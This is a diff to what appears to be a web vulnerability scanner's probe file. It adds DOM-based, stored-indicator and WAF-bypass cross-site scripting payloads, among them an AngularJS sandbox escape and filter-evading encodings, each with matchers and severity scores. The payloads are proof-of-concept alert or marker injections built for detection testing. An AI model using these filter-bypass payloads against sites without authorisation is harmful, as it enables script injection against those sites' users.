@@ -111,6 +111,148 @@
           "variables": {}
         }
       ]
+    },
+    "dom_based": {
+      "description": "DOM XSS probes targeting client-side sinks — javascript: href injection, img onerror, and Angular constructor chain",
+      "tech_match": [],
+      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword", "url", "redirect", "next", "href"],
+      "probes": [
+        {
+          "payload": "javascript:alert(1)",
+          "description": "javascript: pseudo-protocol in href/src — triggers in DOM sinks that set href without sanitisation",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<img src=x onerror=alert(document.domain)>",
+          "description": "img onerror DOM XSS probe using document.domain — confirms execution context",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{constructor.constructor('alert(1)')()}}",
+          "description": "AngularJS sandbox escape via constructor chain — function in response or reflection confirms injection",
+          "matchers": [
+            {"type": "word", "words": ["function"], "condition": "or"},
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "stored_indicator": {
+      "description": "Stored XSS indicator payloads — unique markers designed to survive persistence and be detected on a different page",
+      "tech_match": [],
+      "param_match": ["comment", "msg", "message", "body", "text", "title", "name", "bio", "description", "note"],
+      "probes": [
+        {
+          "payload": "<b>xss_stored_{{marker}}</b>",
+          "description": "Benign bold tag with unique marker — look for reflection on a DIFFERENT page to confirm stored XSS",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "\"><img src=x onerror=alert({{marker}})>",
+          "description": "Attribute breakout + stored onerror probe — marker reflection on another page confirms stored XSS",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "waf_bypass": {
+      "description": "WAF evasion XSS payloads from PayloadsAllTheThings — case mixing, string concat, unicode escapes, self-closing tags",
+      "tech_match": [],
+      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword"],
+      "probes": [
+        {
+          "payload": "<svg/onload=alert(1)//",
+          "description": "SVG onload with trailing double-slash comment — bypasses filters that require closing > bracket",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<details open ontoggle=alert(1)>",
+          "description": "HTML5 details element ontoggle — auto-fires on page load without user interaction",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<img src=x onerror=window['al'+'ert'](1)>",
+          "description": "String concatenation WAF bypass — splits alert keyword to evade static keyword filters",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<img src=x onerror=\\u0061lert(1)>",
+          "description": "Unicode escape WAF bypass — \\u0061 = 'a', bypasses filters matching literal 'alert'",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<ScRiPt>{{marker}}</ScRiPt>",
+          "description": "Mixed case script tag — bypasses case-sensitive keyword blacklists",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<svg><script>alert&#40;1&#41;</script>",
+          "description": "HTML entity encoding inside SVG script — bypasses filters checking for raw parentheses",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<body onload=alert(1)>",
+          "description": "Body onload injection — effective when input is injected near the top of the page body",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        }
+      ]
     }
   }
 }
